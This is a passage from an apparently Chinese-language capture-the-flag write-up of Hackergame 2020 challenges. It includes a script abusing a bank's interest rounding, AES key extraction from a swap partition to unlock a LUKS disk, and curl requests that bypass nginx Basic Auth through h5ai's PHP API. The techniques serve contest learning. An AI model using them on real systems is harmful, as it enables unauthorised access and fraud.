class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 